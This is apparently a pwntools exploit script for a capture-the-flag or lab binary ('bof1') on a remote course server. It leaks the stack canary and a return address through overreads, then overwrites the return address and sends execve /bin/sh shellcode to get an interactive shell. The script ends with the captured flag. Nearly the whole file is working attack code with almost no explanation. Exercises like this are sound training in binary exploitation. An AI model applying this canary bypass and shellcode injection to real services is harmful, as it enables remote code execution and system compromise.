#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#return address maybe 8 more, canary correct (need to go next)
from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
else:
    r = remote('up.zoolab.org', port)

shellcode = """
xor rax, rax
push rax
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall
"""
# 32 byte + return address (16 A, 16 A, return address (msg))
payload = 'A'*41
r.recvuntil(b"name? ")
r.send(payload)
#num41 is 00
out = r.recvline().strip()

padding = b'A' * 41
split_position = out.find(padding) + len(padding)
out = b'\x00' + out[split_position:]  
out1 = out[0:8]
out2 = out[8:]
hex_out = ''.join(f"{byte:02x}" for byte in out)
print("all: ", hex_out)
hex_out = ''.join(f"{byte:02x}" for byte in out1)
print("can: ", hex_out)
hex_out = ''.join(f"{byte:02x}" for byte in out2)
print("add: ", hex_out)


r.recvuntil(b"number? ")
payload = 'A' * 56
r.send(payload)
out = r.recvline().strip()
padding = b'A' * 56
split_position = out.find(padding) + len(padding)
out = out[split_position:]  

out = out.ljust(8, b'\x00')
address = unpack(out, 'all', endian='little')
print(f'Out: {out}\tAddress: {address:#018x}')
address -= 0xa0
address -= 0x8a67
address += 0xd31e0

print(f"new_address: {address:#018x}")
import struct
padding = b"A" * 40

packed_address = struct.pack("<Q", address)

payload = padding + out1 + b"A"*8 + packed_address
print(payload)

r.recvuntil(b"name? ")
r.sendline(payload)
payload = asm(shellcode)
print(payload)
r.recvuntil(b"message: ")
r.send(payload)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

#FLAG{SIMPlY_BUFF3R_0V3RFL0W_w/C@N@RY!!}